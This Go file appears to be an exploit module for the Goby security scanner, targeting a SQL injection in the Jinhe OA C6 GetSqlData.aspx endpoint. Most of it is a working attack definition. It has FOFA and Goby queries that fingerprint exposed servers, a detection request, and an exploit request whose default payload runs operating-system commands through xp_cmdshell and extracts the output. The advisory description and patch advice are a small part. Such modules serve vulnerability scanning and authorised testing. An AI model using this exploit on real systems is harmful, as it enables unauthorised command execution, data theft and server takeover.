package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jinhe OA C6 GetSqlData.aspx SQL injection Vulnerability",
    "Description": "<p>Jinhe Digital Intelligent Office Platform (referred to as JC6) is a digital office platform that integrates artificial intelligence technology, providing enterprises with intelligent office experiences and comprehensive support for digital transformation. It complies with national Xinchuang certification standards and supports organizational digital transformation, enabling the digitalization, intelligence, and collaboration of business processes to enhance enterprise competitiveness.</p><p>Jinhe OA C6 GetSqlData.aspx has a SQL injection vulnerability, which attackers can exploit to execute arbitrary SQL statements, retrieve database information, and execute system commands.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-03-11",
    "PostTime": "2024-03-14",
    "Author": "2783712916@qq.com",
    "FofaQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || body=\"href=\\\"/jc6/platform/\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\")) ",
    "GobyQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || body=\"href=\\\"/jc6/platform/\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\")) ",
    "Level": "3",
    "Impact": "<p>Jinhe OA C6 GetSqlData.aspx has a SQL injection vulnerability, which attackers can exploit to execute arbitrary SQL statements, retrieve database information, and execute system commands.</p>",
    "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqlPayload",
            "type": "textarea",
            "value": "exec xp_cmdshell 'whoami'",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/C6/Control/GetSqlData.aspx/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "select 'AAAA123456ffffffffffffffff';"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "AAAA123456ffffffffffffffff",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/C6/Control/GetSqlData.aspx/",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/C6/Control/GetSqlData.aspx/"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/C6/Control/GetSqlData.aspx/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "{{{sqlPayload}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<record><item ColumnName='output'><![CDATA[",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<record><item[^>]*><!\\[CDATA\\[(.*?)\\]\\]></item></record>"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "Command Execution",
        "HW-2023"
    ],
    "VulType": [
        "Command Execution",
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "金和OA C6 GetSqlData.aspx 前台SQL注入漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和数字化智能办公平台（简称JC6）是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。同时符合国家信创认证标准，支持组织数字化转型，实现业务流程的数字化、智能化和协同化，提高企业竞争力。</p><p>金和OA C6 GetSqlData.aspx 存在SQL注入漏洞，攻击者利用该漏洞可以执行任意sql语句获取数据库信息、执行系统命令。</p>",
            "Recommendation": "<p>1.联系相关厂商，获取安全补丁，及时进行漏洞修复</p><p>2.联系相关安全厂商，及时更新安全阻断策略<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端执行任意sql语句，可获取数据、写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "SQL注入",
                "命令执行"
            ],
            "Tags": [
                "SQL注入",
                "命令执行",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Jinhe OA C6 GetSqlData.aspx SQL injection Vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinhe Digital Intelligent Office Platform (referred to as JC6) is a digital office platform that integrates artificial intelligence technology, providing enterprises with intelligent office experiences and comprehensive support for digital transformation. It complies with national Xinchuang certification standards and supports organizational digital transformation, enabling the digitalization, intelligence, and collaboration of business processes to enhance enterprise competitiveness.</p><p>Jinhe OA C6 GetSqlData.aspx has a SQL injection vulnerability, which attackers can exploit to execute arbitrary SQL statements, retrieve database information, and execute system commands.</p>",
            "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
            "Impact": "<p>Jinhe OA C6 GetSqlData.aspx has a SQL injection vulnerability, which attackers can exploit to execute arbitrary SQL statements, retrieve database information, and execute system commands.<br></p>",
            "VulType": [
                "Command Execution",
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Command Execution",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
